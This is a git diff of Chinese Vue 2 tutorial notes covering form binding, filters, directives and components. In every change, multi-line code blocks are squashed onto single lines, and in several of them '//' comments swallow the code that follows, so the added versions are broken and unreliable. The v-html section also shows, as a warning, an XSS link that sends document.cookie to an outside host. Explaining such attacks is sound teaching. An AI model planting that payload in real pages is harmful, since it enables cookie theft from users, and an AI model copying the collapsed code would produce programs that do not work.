 * 注意计算属性里写的排序和过滤，要保证在过滤后的数据排序才能达到要求
@@ -1380,59 +758,7 @@ watch: {
 ## 十三 收集表单数据
 
 ~~~html
-<body>
-    <div id="app">
-        <form @submit.prevent='demo'>
-            账号：<input type="text" v-model.trim="account"><br><br>
-            密码：<input type="password" v-model="pwd"><br><br>
-            性别：<br><br>
-            男<input type="radio" name="sex" value=0 v-model.number="sex">
-            女<input type="radio" name="sex" value=1 v-model.number="sex"><br><br>
-            爱好：<br><br>
-            抽烟<input type="checkbox" value="抽烟" v-model="hobby">
-            喝酒<input type="checkbox" value="喝酒" v-model="hobby">
-            烫头<input type="checkbox" value="烫头" v-model="hobby"><br><br>
-            所属地址
-            <select v-model="city">
-                <option value="">请选择地址</option>
-                <option value="beijing">北京</option>
-                <option value="shanghai">上海</option>
-                <option value="chengdu">成都</option>
-                <option value="shengzheng">深圳</option>
-            </select><br><br>
-            其他信息：<br><br>
-            <textarea cols="30" rows="10" v-model.lazy="otherInfo"></textarea><br><br>
-            <input type="checkbox" v-model='isAgree'>阅读并接受用户信息   <a href="http://www.baidu.com">《用户协议》</a>
-            <button>提交</button>
-        </form>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                  account: '',
-                  pwd: '',
-                  sex: 0,
-                  hobby: [],
-                  city: '',
-                  otherInfo: '',
-                  isAgree: false
-              }
-           },
-           methods: {
-               demo(){
-                   console.log("用户信息");
-                   //1.这样可以，但是不建议直接访问_data
-                   console.log(JSON.stringify(this._data));
-                    //2.封装用户对象,或者在data里就写成对象的形式
-                    console.log('ajax');
-               }
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <form @submit.prevent='demo'>            账号：<input type="text" v-model.trim="account"><br><br>            密码：<input type="password" v-model="pwd"><br><br>            性别：<br><br>            男<input type="radio" name="sex" value=0 v-model.number="sex">            女<input type="radio" name="sex" value=1 v-model.number="sex"><br><br>            爱好：<br><br>            抽烟<input type="checkbox" value="抽烟" v-model="hobby">            喝酒<input type="checkbox" value="喝酒" v-model="hobby">            烫头<input type="checkbox" value="烫头" v-model="hobby"><br><br>            所属地址            <select v-model="city">                <option value="">请选择地址</option>                <option value="beijing">北京</option>                <option value="shanghai">上海</option>                <option value="chengdu">成都</option>                <option value="shengzheng">深圳</option>            </select><br><br>            其他信息：<br><br>            <textarea cols="30" rows="10" v-model.lazy="otherInfo"></textarea><br><br>            <input type="checkbox" v-model='isAgree'>阅读并接受用户信息   <a href="http://www.baidu.com">《用户协议》</a>            <button>提交</button>        </form>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  account: '',                  pwd: '',                  sex: 0,                  hobby: [],                  city: '',                  otherInfo: '',                  isAgree: false              }           },           methods: {               demo(){                   console.log("用户信息");                   //1.这样可以，但是不建议直接访问_data                   console.log(JSON.stringify(this._data));                    //2.封装用户对象,或者在data里就写成对象的形式                    console.log('ajax');               }           }        })    </script></body>
 ~~~
 
 * radio和checkbox要自己配置value值，如果不配置默认收集checked状态（boolean）
@@ -1440,20 +766,13 @@ watch: {
   * checkbox收集的数据要初始化为数组，才会是想要的效果，不然仍然是收集checked状态
 
   * ~~~javascript
-    data () {
-                  return {
-                      account: '',
-                      pwd: '',
-                      sex: 0,
-                      hobby: []
-                  }
+    data () {              return {                  account: '',                  pwd: '',                  sex: 0,                  hobby: []              }
+    ~~~
 
 * v-model 也可以加修饰符，不然输入的东西会被默认为字符
 
   * ~~~html
-    性别：<br><br>
-    男<input type="radio" name="sex" value=0 v-model.number="sex">
-    女<input type="radio" name="sex" value=1 v-model.number="sex"><br><br>
+    性别：<br><br>男<input type="radio" name="sex" value=0 v-model.number="sex">女<input type="radio" name="sex" value=1 v-model.number="sex"><br><br>
     ~~~
 
   * 其他修饰符
@@ -1461,14 +780,13 @@ watch: {
     * .lazy 当焦点移出去才会收集
 
     * ~~~html
-      其他信息：<br><br>
-      <textarea cols="30" rows="10" v-model.lazy="otherInfo"></textarea><br><br>
+      其他信息：<br><br><textarea cols="30" rows="10" v-model.lazy="otherInfo"></textarea><br><br>
       ~~~
 
     * .trim 去掉前后空格
 
     * ~~~html
-       账号：<input type="text" v-model.trim="account"><br><br>
+      账号：<input type="text" v-model.trim="account"><br><br>
       ~~~
 
 * 一般现在都不让表单默认提交并刷新页面，而只是将表单作为结构使用
@@ -1485,29 +803,7 @@ watch: {
 * 1. 使用计算属性实现
 
 ~~~html
-<body>
-    <div id="app">
-        <h1>时间： {{ fTime }}</h1>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script src="../node_modules/dayjs/dayjs.min.js"></script>
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                  time: Date.now()
-              }
-           },
-           computed: {
-               fTime(){
-                //    return dayjs(this.time)
-                   return dayjs(this.time).format('YY-MM-DD: mm-ss')
-               }
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <h1>时间： {{ fTime }}</h1>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script src="../node_modules/dayjs/dayjs.min.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  time: Date.now()              }           },           computed: {               fTime(){                //    return dayjs(this.time)                   return dayjs(this.time).format('YY-MM-DD: mm-ss')               }           }        })    </script></body>
 ~~~
 
 * 2. 使用过滤器实现
@@ -1517,90 +813,21 @@ watch: {
 * 而且vue自己将参数传了进去，只用接收直接用就行
 
 ~~~html
-<body>
-    <div id="app">
-        <!-- <h1>时间： {{ fTime }}</h1> -->
-        <h1>时间： {{ time | timeFormater }}</h1>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script src="../node_modules/dayjs/dayjs.min.js"></script>
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                  time: Date.now()
-              }
-           },
-        filters:{
-            timeFormater(value){
-                return dayjs(value).format('YY-MM-DD: mm-ss')
-            }
-        }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <!-- <h1>时间： {{ fTime }}</h1> -->        <h1>时间： {{ time | timeFormater }}</h1>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script src="../node_modules/dayjs/dayjs.min.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  time: Date.now()              }           },        filters:{            timeFormater(value){                return dayjs(value).format('YY-MM-DD: mm-ss')            }        }        })    </script></body>
 ~~~
 
 * 3. 过滤器的高级写法
-*  过滤器接收的第一个参数是管道符前面的值
+* 过滤器接收的第一个参数是管道符前面的值
 * 可以用第二个参数来接收过滤器传进来的参数
 
 ~~~html
-<body>
-    <div id="app">
-        <!-- <h1>时间： {{ fTime }}</h1> -->
-        <h1>时间： {{ time | timeFormater('YY-MM-DD: mm-ss') }}</h1>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script src="../node_modules/dayjs/dayjs.min.js"></script>
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                  time: Date.now()
-              }
-           },
-        filters:{
-            timeFormater(value, str='YY-MM-DD'){
-                return dayjs(value).format(str)
-            }
-        }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <!-- <h1>时间： {{ fTime }}</h1> -->        <h1>时间： {{ time | timeFormater('YY-MM-DD: mm-ss') }}</h1>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script src="../node_modules/dayjs/dayjs.min.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  time: Date.now()              }           },        filters:{            timeFormater(value, str='YY-MM-DD'){                return dayjs(value).format(str)            }        }        })    </script></body>
 ~~~
 
 * 可以同时用多个过滤器，形成一种嵌套，后面的会将前面的值作为参数
 
 ~~~html
-<body>
-    <div id="app">
-        <!-- <h1>时间： {{ fTime }}</h1> -->
-        <h1>时间： {{ time | timeFormater('YY-MM-DD: mm-ss') | strSlice }}</h1>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script src="../node_modules/dayjs/dayjs.min.js"></script>
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                  time: Date.now()
-              }
-           },
-        filters:{
-            timeFormater(value, str='YY-MM-DD'){
-                return dayjs(value).format(str)
-            },
-            strSlice(value){
-                return value.slice(0,4)
-            }
-        }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <!-- <h1>时间： {{ fTime }}</h1> -->        <h1>时间： {{ time | timeFormater('YY-MM-DD: mm-ss') | strSlice }}</h1>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script src="../node_modules/dayjs/dayjs.min.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  time: Date.now()              }           },        filters:{            timeFormater(value, str='YY-MM-DD'){                return dayjs(value).format(str)            },            strSlice(value){                return value.slice(0,4)            }        }        })    </script></body>
 ~~~
 
 * 写在vue实例里的过滤器（局部过滤器）只能供该实例使用，其他vue实例（或组件）不能使用
@@ -1608,47 +835,7 @@ watch: {
 * 全局过滤器，写在Vue.filter('方法名'，回调函数),传参方式一样
 
 ~~~html
-<body>
-    <div id="app">
-        <h1>时间： {{ time | timeFormater('YY-MM-DD: mm-ss') | gSlice(5) }}</h1>
-    </div>
-    <div id="app2">
-        <h2>截取{{ message | gSlice(5) }}</h2>
-    </div>
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script src="../node_modules/dayjs/dayjs.min.js"></script>
-    <script>
-
-        Vue.filter('gSlice',function(value,n){
-            return value.slice(0,n)
-        })
-
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                  time: Date.now()
-              }
-           },
-        filters:{
-            timeFormater(value, str='YY-MM-DD'){
-                return dayjs(value).format(str)
-            },
-            strSlice(value){
-                return value.slice(0,4)
-            }
-        }
-        })
-        new Vue({
-           el: '#app2',
-           data () {
-              return {
-                  message: "123456789"
-              }
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <h1>时间： {{ time | timeFormater('YY-MM-DD: mm-ss') | gSlice(5) }}</h1>    </div>    <div id="app2">        <h2>截取{{ message | gSlice(5) }}</h2>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script src="../node_modules/dayjs/dayjs.min.js"></script>    <script>        Vue.filter('gSlice',function(value,n){            return value.slice(0,n)        })        new Vue({           el: '#app',           data () {              return {                  time: Date.now()              }           },        filters:{            timeFormater(value, str='YY-MM-DD'){                return dayjs(value).format(str)            },            strSlice(value){                return value.slice(0,4)            }        }        })        new Vue({           el: '#app2',           data () {              return {                  message: "123456789"              }           }        })    </script></body>
 ~~~
 
 * 注意，v-model 不能绑定过滤器
@@ -1664,25 +851,7 @@ watch: {
 * v-text会将所有字符串正常当作字符串显示，不会解析标签文本
 
 ~~~html
-<body>
-    
-    <div id="app">
-        <h1>{{ msg }}</h1>
-        <h1 v-text='msg'>我这几个字会被替换掉</h1>
-    </div>
-
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                  msg: 'hello vvvvv'
-              }
-           }
-        })
-    </script>
-</body>
+<body>        <div id="app">        <h1>{{ msg }}</h1>        <h1 v-text='msg'>我这几个字会被替换掉</h1>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  msg: 'hello vvvvv'              }           }        })    </script></body>
 ~~~
 
 ### v-html
@@ -1691,26 +860,7 @@ watch: {
 * 这里页面会显示出a连接
 
 ~~~html
-<body>
-    
-    <div id="app">
-        <h1>{{ msg }}</h1>
-        <h1 v-html='msg'>我这几个字会被替换掉</h1>
-        
-    </div>
-
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                  msg: 'hello  <a href="http://www.baidu.com">baidu</a>'
-              }
-           }
-        })
-    </script>
-</body>
+<body>        <div id="app">        <h1>{{ msg }}</h1>        <h1 v-html='msg'>我这几个字会被替换掉</h1>            </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  msg: 'hello  <a href="http://www.baidu.com">baidu</a>'              }           }        })    </script></body>
 ~~~
 
 * 安全性问题
@@ -1720,24 +870,7 @@ watch: {
 例如：
 
 ~~~html
-<body>
-    
-    <div id="app">
-        <h1 v-html='msg'></h1>
-    </div>
-
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                  msg: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>这是一段诱惑性文字，你看到一定会点我的</a>'
-              }
-           }
-        })
-    </script>
-</body>
+<body>        <div id="app">        <h1 v-html='msg'></h1>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  msg: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>这是一段诱惑性文字，你看到一定会点我的</a>'              }           }        })    </script></body>
 ~~~
 
 这段字符串将会被解析为a标签显示在页面上，如果用户点击了该链接，将跳转到该网站并附带上当前网站的cookie信息
@@ -1801,26 +934,7 @@ https://www.baidu.com/?id=root;%20pwd=111111
 * 以后数据的改变，不会引起v-once所在标签里的数据的改变
 
 ~~~html
-<body>
-    
-    <div id="app">
-        <h1 v-once>a的初始值是：{{ a }}</h1>
-        <h2>a: {{ a }}</h2>
-        <button @click='a++'>a++</button>
-    </div>
-
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                  a: 1
-              }
-           }
-        })
-    </script>
-</body>
+<body>        <div id="app">        <h1 v-once>a的初始值是：{{ a }}</h1>        <h2>a: {{ a }}</h2>        <button @click='a++'>a++</button>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  a: 1              }           }        })    </script></body>
 ~~~
 
 ### v-pre
@@ -1829,26 +943,7 @@ https://www.baidu.com/?id=root;%20pwd=111111
 * 写成什么样，页面就显示什么样
 
 ~~~html
-<body>
-    
-    <div id="app">
-        <h1 v-pre>hello</h1>
-        <h2 v-pre>a: {{ a }}</h2>
-        <button v-pre @click='a++'>a++</button>
-    </div>
-
-    <script src="../node_modules/vue/dist/vue.js"></script>
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                  a: 1
-              }
-           }
-        })
-    </script>
-</body>
+<body>        <div id="app">        <h1 v-pre>hello</h1>        <h2 v-pre>a: {{ a }}</h2>        <button v-pre @click='a++'>a++</button>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  a: 1              }           }        })    </script></body>
 ~~~
 
 * 可以利用它跳过哪些没有用指令用法，插值语法的节点，加快编译，提高效率
@@ -1856,38 +951,7 @@ https://www.baidu.com/?id=root;%20pwd=111111
 ## 十六 自定义指令
 
 ~~~html
-<body>
-    <div id="app">
-        <h1>a的值为：<span v-text="a"></span></h1>
-        <h2>a的五倍值为：<span v-five="a"></span></h1>
-        <button @click="a++">a++</button>
-    </div>
-
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                  a:1
-              }
-           },
-           directives:{
-            //    第一种写法，写为对象形式，可以处理一些细节上的问题
-            //    five:{
-            //        k:v,
-            //        k:v,
-            //        ...
-            //    }
-                //第二种写法，函数形式，不能处理一些细节问题
-                five(element,binding){
-                    console.log(element instanceof HTMLElement);//true
-                    console.log(binding.value);//就是 v-five后的值
-                    element.innerText = binding.value * 5
-                }
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <h1>a的值为：<span v-text="a"></span></h1>        <h2>a的五倍值为：<span v-five="a"></span></h1>        <button @click="a++">a++</button>    </div>    <script>        new Vue({           el: '#app',           data () {              return {                  a:1              }           },           directives:{            //    第一种写法，写为对象形式，可以处理一些细节上的问题            //    five:{            //        k:v,            //        k:v,            //        ...            //    }                //第二种写法，函数形式，不能处理一些细节问题                five(element,binding){                    console.log(element instanceof HTMLElement);//true                    console.log(binding.value);//就是 v-five后的值                    element.innerText = binding.value * 5                }           }        })    </script></body>
 ~~~
 
 * 在vue实例里加上配置项 directives
@@ -1905,12 +969,7 @@ https://www.baidu.com/?id=root;%20pwd=111111
 **例子：让元素默认获取焦点**
 
 ~~~javascript
-directives:{
-               fbind(e,b){
-                   e.value = b.value
-                   e.focus()
-               }
-           }
+directives:{               fbind(e,b){                   e.value = b.value                   e.focus()               }           }
 ~~~
 
 * 这段代码在页面刷新之后，并不会获取焦点，当你点击按钮时候才可以，但其实页面刷新后，该函数执行过一次了
@@ -1922,19 +981,7 @@ directives:{
 **使用对象形式**
 
 ~~~javascript
-directives:{
-			fbind:{
-         bind(){
-            console.log('bind');
-         },
-         inserted(){
-            console.log('insert');
-         },
-         update(){
-            console.log('update');
-         }
-     }
-}
+directives:{			fbind:{         bind(){            console.log('bind');         },         inserted(){            console.log('insert');         },         update(){            console.log('update');         }     }}
 ~~~
 
 * 里面有三个函数（一般称为钩子）
@@ -1944,42 +991,7 @@ directives:{
   * 这三个函数接收到的参数与函数指令形式一样  （element，binding）
 
 ~~~html
-<body>
-    <div id="app">
-        <h1>a的值为：<span v-text="a"></span></h1>
-        <hr>
-        <input type="text" v-fbind:value="a">
-        <button @click="a++">a++</button>
-    </div>
-
-    <script>
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                  a:1
-              }
-           },
-           directives:{
-                fbind:{
-                    bind(){
-                        console.log('bind');
-                    },
-                    inserted(e,b){
-                        console.log('insert');
-                        e.value = b.value
-                        e.focus()
-                    },
-                    update(e,b){
-                        console.log('update');
-                        e.value = b.value * 5
-                        e.focus()
-                    }
-                }
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <h1>a的值为：<span v-text="a"></span></h1>        <hr>        <input type="text" v-fbind:value="a">        <button @click="a++">a++</button>    </div>    <script>        new Vue({           el: '#app',           data () {              return {                  a:1              }           },           directives:{                fbind:{                    bind(){                        console.log('bind');                    },                    inserted(e,b){                        console.log('insert');                        e.value = b.value                        e.focus()                    },                    update(e,b){                        console.log('update');                        e.value = b.value * 5                        e.focus()                    }                }           }        })    </script></body>
 ~~~
 
 **注意点**
@@ -2152,30 +1164,7 @@ directives:{
 例子，有这么一个结构
 
 ~~~html
-<body>
-    <div id="app">
-        <h2>学校名字：{{ schoolName }}</h2>
-        <h2>学校地址：{{ schoolAddress }}</h2>
-        <br><hr><br>
-        <h2>学生名字：{{ studentName }}</h2>
-        <h2>学生地址：{{ studentAddress }}</h2>
-    </div>
-    <script>
-        Vue.config.productionTip = false
-
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                  schoolName: 'cup',
-                  schoolAddress:'beijin cp',
-                  studentName: 'shishi',
-                  studentAddress: 'runjie house'
-              }
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <h2>学校名字：{{ schoolName }}</h2>        <h2>学校地址：{{ schoolAddress }}</h2>        <br><hr><br>        <h2>学生名字：{{ studentName }}</h2>        <h2>学生地址：{{ studentAddress }}</h2>    </div>    <script>        Vue.config.productionTip = false        new Vue({           el: '#app',           data () {              return {                  schoolName: 'cup',                  schoolAddress:'beijin cp',                  studentName: 'shishi',                  studentAddress: 'runjie house'              }           }        })    </script></body>
 ~~~
 
 * 现在将学校和学生单独拆出来
@@ -2185,24 +1174,7 @@ directives:{
   * 创建组件
 
   ~~~javascript
-  //创建一个school组件
-          const school = Vue.extend({
-              data () {
-                return {
-                    schoolName: 'cup',
-                    schoolAddress:'beijin cp',
-                }
-             }
-          })
-          //创建student组件
-          const student = Vue.extend({
-              data () {
-                return {
-                  studentName: 'shishi',
-                  studentAddress: 'runjie house'
-                }
-             }
-          })
+  //创建一个school组件        const school = Vue.extend({            data () {              return {                  schoolName: 'cup',                  schoolAddress:'beijin cp',              }           }        })        //创建student组件        const student = Vue.extend({            data () {              return {                studentName: 'shishi',                studentAddress: 'runjie house'              }           }        })
   ~~~
 
   
@@ -2210,14 +1182,7 @@ directives:{
   * 注册组件
 
   ~~~javascript
-  			new Vue({
-             el: '#app',
-             //局部注册组件
-             components: {
-                 school_component: school,
-                 student_component: student
-             }
-          })
+  			new Vue({           el: '#app',           //局部注册组件           components: {               school_component: school,               student_component: student           }        })
   ~~~
 
   
@@ -2227,36 +1192,7 @@ directives:{
 要将html模板从html结构中拆出来放到组件中template：配置项上
 
 ~~~javascript
- //创建一个school组件
-        const school = Vue.extend({
-            template: `
-                <div>
-                    <h2>学校名字：{{ schoolName }}</h2>
-                     <h2>学校地址：{{ schoolAddress }}</h2>    
-                </div>
-            `,
-            data () {
-              return {
-                  schoolName: 'cup',
-                  schoolAddress:'beijin cp',
-              }
-           }
-        })
-        //创建student组件
-        const student = Vue.extend({
-            template: `
-                <div>
-                    <h2>学生名字：{{ studentName }}</h2>
-                    <h2>学生地址：{{ studentAddress }}</h2>    
-                </div>
-            `,
-            data () {
-              return {
-                studentName: 'shishi',
-                studentAddress: 'runjie house'
-              }
-           }
-        })
+ //创建一个school组件        const school = Vue.extend({            template: `                <div>                    <h2>学校名字：{{ schoolName }}</h2>                     <h2>学校地址：{{ schoolAddress }}</h2>                    </div>            `,            data () {              return {                  schoolName: 'cup',                  schoolAddress:'beijin cp',              }           }        })        //创建student组件        const student = Vue.extend({            template: `                <div>                    <h2>学生名字：{{ studentName }}</h2>                    <h2>学生地址：{{ studentAddress }}</h2>                    </div>            `,            data () {              return {                studentName: 'shishi',                studentAddress: 'runjie house'              }           }        })
 ~~~
 
 然后将组件标签加到html结构中（和html标签一样的写法）
@@ -2264,68 +1200,13 @@ directives:{
 并且标签在解析时候，会变成大写开头的驼峰命名
 
 ~~~html
-<div id="app">
-        <!-- 使用组件标签 -->
-        <school_component></school_component>
-        <br><hr><br>
-        <student_component></school_component>
-    </div>
+<div id="app">        <!-- 使用组件标签 -->        <school_component></school_component>        <br><hr><br>        <student_component></school_component>    </div>
 ~~~
 
 完整文件
 
 ~~~html
-<body>
-    <div id="app">
-        <!-- 使用组件标签 -->
-        <school_component></school_component>
-        <br><hr><br>
-        <student_component></school_component>
-    </div>
-    <script>
-        Vue.config.productionTip = false
-
-        //创建一个school组件
-        const school = Vue.extend({
-            template: `
-                <div>
-                    <h2>学校名字：{{ schoolName }}</h2>
-                     <h2>学校地址：{{ schoolAddress }}</h2>    
-                </div>
-            `,
-            data () {
-              return {
-                  schoolName: 'cup',
-                  schoolAddress:'beijin cp',
-              }
-           }
-        })
-        //创建student组件
-        const student = Vue.extend({
-            template: `
-                <div>
-                    <h2>学生名字：{{ studentName }}</h2>
-                    <h2>学生地址：{{ studentAddress }}</h2>    
-                </div>
-            `,
-            data () {
-              return {
-                studentName: 'shishi',
-                studentAddress: 'runjie house'
-              }
-           }
-        })
-
-        new Vue({
-           el: '#app',
-           //局部注册组件
-           components: {
-               school_component: school,
-               student_component: student
-           }
-        })
-    </script>
-</body>
+<body>    <div id="app">        <!-- 使用组件标签 -->        <school_component></school_component>        <br><hr><br>        <student_component></school_component>    </div>    <script>        Vue.config.productionTip = false        //创建一个school组件        const school = Vue.extend({            template: `                <div>                    <h2>学校名字：{{ schoolName }}</h2>                     <h2>学校地址：{{ schoolAddress }}</h2>                    </div>            `,            data () {              return {                  schoolName: 'cup',                  schoolAddress:'beijin cp',              }           }        })        //创建student组件        const student = Vue.extend({            template: `                <div>                    <h2>学生名字：{{ studentName }}</h2>                    <h2>学生地址：{{ studentAddress }}</h2>                    </div>            `,            data () {              return {                studentName: 'shishi',                studentAddress: 'runjie house'              }           }        })        new Vue({           el: '#app',           //局部注册组件           components: {               school_component: school,               student_component: student           }        })    </script></body>
 ~~~
 
 
@@ -2346,55 +1227,19 @@ directives:{
 * 我们可以决定在开发者工具中呈现的标签名字，不改代码注册时候和应用时候
 
 ~~~javascript
-const hello = Vue.extend({
-            template:`
-                <div>
-                    <h1>hello {{ name }}</h1>
-                </div>
-            `,
-            data () {
-                return {
-                    name: "shishi"
-                }
-            },
-             name: 'ggggg'
-        })
-//开发者工具中可以看到
-<Ggggg>
+const hello = Vue.extend({            template:`                <div>                    <h1>hello {{ name }}</h1>                </div>            `,            data () {                return {                    name: "shishi"                }            },             name: 'ggggg'        })//开发者工具中可以看到<Ggggg>
 ~~~
 
 * 我们创建组件时候可以简写
 
 * ~~~javascript
-  const hello = Vue.extend({
-              template:`
-                  <div>
-                      <h1>hello {{ name }}</h1>
-                  </div>
-              `,
-              data () {
-                  return {
-                      name: "shishi"
-                  }
-              },
-          })
+  const hello = Vue.extend({            template:`                <div>                    <h1>hello {{ name }}</h1>                </div>            `,            data () {                return {                    name: "shishi"                }            },        })
   ~~~
 
 * 写为
 
 * ~~~html
-  const hello ={
-              template:`
-                  <div>
-                      <h1>hello {{ name }}</h1>
-                  </div>
-              `,
-              data () {
-                  return {
-                      name: "shishi"
-                  }
-              },
-          }
+  const hello ={            template:`                <div>                    <h1>hello {{ name }}</h1>                </div>            `,            data () {                return {                    name: "shishi"                }            },        }
   ~~~
 
 * Vue.extend（）方法会在注册组件时候，vue帮我们调用
@@ -2402,20 +1247,7 @@ const hello = Vue.extend({
 **组件全局注册（用的少）**Vue.component（’名字‘，组件对象）
 
 ~~~javascript
-const hello = Vue.extend({
-            template:`
-                <div>
-                    <h1>hello {{ name }}</h1>
-                </div>
-            `,
-            data () {
-                return {
-                    name: "shishi"
-                }
-            }
-        })
-
-        Vue.component('hello', hello)
+const hello = Vue.extend({            template:`                <div>                    <h1>hello {{ name }}</h1>                </div>            `,            data () {                return {                    name: "shishi"                }            }        })        Vue.component('hello', hello)
 ~~~
 
 * 这样任何一个vm都能使用该Hello标签组件
@@ -2526,36 +1358,7 @@ Vue.extend = function (extendOptions) {
 这样处理可以让组件实例对象可以访问到Vue原型上的属性、方法
 
 ~~~html
-<script>
-        Vue.config.productionTip = false
-
-         //创建一个school组件
-         const school = Vue.extend({
-            template: `
-                <div>
-                    <h2>学校名字：{{ schoolName }}</h2>
-                     <h2>学校地址：{{ schoolAddress }}</h2>  
-                </div>
-            `,
-            data () {
-              return {
-                  schoolName: 'cup',
-                  schoolAddress:'beijin cp',
-              }
-           },
-        })
-
-        new Vue({
-           el: '#app',
-           data () {
-              return {
-                  msg: 'hello'
-              }
-           }
-        })
-
-        console.log(school.prototype.__proto__ === Vue.prototype);//true
-    </script>
+<script>        Vue.config.productionTip = false         //创建一个school组件         const school = Vue.extend({            template: `                <div>                    <h2>学校名字：{{ schoolName }}</h2>                     <h2>学校地址：{{ schoolAddress }}</h2>                  </div>            `,            data () {              return {                  schoolName: 'cup',                  schoolAddress:'beijin cp',              }           },        })        new Vue({           el: '#app',           data () {              return {                  msg: 'hello'              }           }        })        console.log(school.prototype.__proto__ === Vue.prototype);//true    </script>
 ~~~
 
 
@@ -2571,19 +1374,7 @@ Vue.extend = function (extendOptions) {
 .vue文件的基本结构（实现应用中局部功能代码和资源的集合）
 
 ~~~vue
-<template>
-  
-</template>
-
-<script>
-export default {
-
-}
-</script>
-
-<style>
-
-</style>
+<template>  </template><script>export default {}</script><style></style>
 ~~~
 
 * template里必须要有一个div包裹其他结构、template不参与结构渲染
@@ -2600,27 +1391,7 @@ export default {
 创建我们的组件 school.vue文件
 
 ~~~vue
-<template>
-    <div>
-        <h2>学校名字：{{ schoolName }}</h2>
-        <h2>学校地址：{{ schoolAddress }}</h2>
-    </div>
-</template>
-
-<script>
-export default {
-  data() {
-    return {
-      schoolName: "cup",
-      schoolAddress: "beijin cp",
-    }
-  },
-}
-</script>
-
-<style>
-
-</style>
+<template>    <div>        <h2>学校名字：{{ schoolName }}</h2>        <h2>学校地址：{{ schoolAddress }}</h2>    </div></template><script>export default {  data() {    return {      schoolName: "cup",      schoolAddress: "beijin cp",    }  },}</script><style></style>
 ~~~
 
 创建App.vue文件
@@ -2628,25 +1399,7 @@ export default {
 在交互里引入 刚刚的子组件school.vue并注册组件
 
 ~~~vue
-<template>
-  <div>
-      <School></school>
-  </div>
-</template>
-
-<script>
-//引入组件
-import School from './school.vue'
-
-export default {
-    name: 'App',
-    components: {School}
-}
-</script>
-
-<style>
-
-</style>
+<template>  <div>      <School></school>  </div></template><script>//引入组件import School from './school.vue'export default {    name: 'App',    components: {School}}</script><style></style>
 ~~~
 
 创建main.js文件
@@ -2654,15 +1407,7 @@ export default {
 引入 App.vue文件，并注册组件，并创建Vue实例，为了 index.html中的容器看起来简洁，直接在这里写模板
 
 ~~~js
-import App from './App.vue'
-
-new Vue({
-   el: '#root',
-   template: `
-    <App></App>
-   `,
-   components:{App}
-})
+import App from './App.vue'new Vue({   el: '#root',   template: `    <App></App>   `,   components:{App}})
 ~~~
 
 创建index.html文件
@@ -2670,21 +1415,7 @@ new Vue({
 * 注意引入vue文件，注意引入main.js，并且尽量写在容器下面
 
 ~~~html
-<!DOCTYPE html>
-<html lang="zh">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<body>
-    <div id="root">
-    </div>
-    <script src="../../node_modules/vue/dist/vue.js"></script>
-    <script src="./main.js"></script>
-</body>
-</html>
+<!DOCTYPE html><html lang="zh"><head>    <meta charset="UTF-8">    <meta http-equiv="X-UA-Compatible" content="IE=edge">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Document</title></head><body>    <div id="root">    </div>    <script src="../../node_modules/vue/dist/vue.js"></script>    <script src="./main.js"></script></body></html>
 ~~~
 
 * 到此就是一个完整的组件化开发，但是这里浏览器是不能运行成功的，因为浏览器不能直接解析es6的js语法（import语法）
@@ -2734,7 +1465,7 @@ new Vue({
 
 index.html文件中的noscript标签标识，浏览器不支持js时候内容就会被渲染
 
